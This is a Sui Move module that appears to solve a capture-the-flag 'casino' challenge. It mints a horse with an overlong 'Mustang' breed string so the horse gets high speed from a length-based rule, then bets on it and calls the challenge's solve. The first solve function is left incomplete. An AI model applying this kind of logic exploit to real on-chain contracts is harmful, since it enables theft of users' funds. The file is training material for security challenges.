module solution::solution {
    use std::string::utf8;
    use sui::coin::{Self, Coin};
    use challenge::casino_coin::CASINO_COIN;
    use challenge::exchange::{Self, CasinoExchange};
    use challenge::stall::{Self, BetStall};

    public entry fun solve(
        exchange: &mut CasinoExchange,
        stall: &mut BetStall,
        ctx: &mut TxContext,
    ) {
        // Step 1: Claim 100 free coins
        exchange::claim_coin(exchange, ctx);

        // Step 2: Mint a horse with a long breed containing "Mustang" (speed = string length > 12)
        // "MustangMustangMustang" = 21 chars > 12 (Thoroughbred), passes is_valid_breed
        stall::mint_horse(
            stall,
            utf8(b"Exploit"),
            utf8(b"red"),
            utf8(b"MustangMustangMustang"),
            ctx,
        );

        // Step 3: Bet 50 on our fast horse (index 5, the 6th horse)
        // We need to split our 100-coin into 50 for bet
        // But claim_coin transfers to sender... we can't access it in the same tx
        // We need to receive the coin as a parameter instead
    }

    // Alternative: do it in steps via separate entry functions
    // Or pass the coin as parameter

    public entry fun step1_claim(
        exchange: &mut CasinoExchange,
        ctx: &mut TxContext,
    ) {
        exchange::claim_coin(exchange, ctx);
    }

    public entry fun step2_mint(
        stall: &mut BetStall,
        ctx: &mut TxContext,
    ) {
        stall::mint_horse(
            stall,
            utf8(b"Exploit"),
            utf8(b"red"),
            utf8(b"MustangMustangMustang"),
            ctx,
        );
    }

    public entry fun step3_bet(
        stall: &mut BetStall,
        coin: Coin<CASINO_COIN>,
        ctx: &mut TxContext,
    ) {
        // Our horse is at index 5
        stall::bet(stall, 5, coin, ctx);
    }

    public entry fun step4_solve(
        exchange: &mut CasinoExchange,
        coin: Coin<CASINO_COIN>,
        ctx: &mut TxContext,
    ) {
        exchange::solve(exchange, coin, ctx);
    }
}
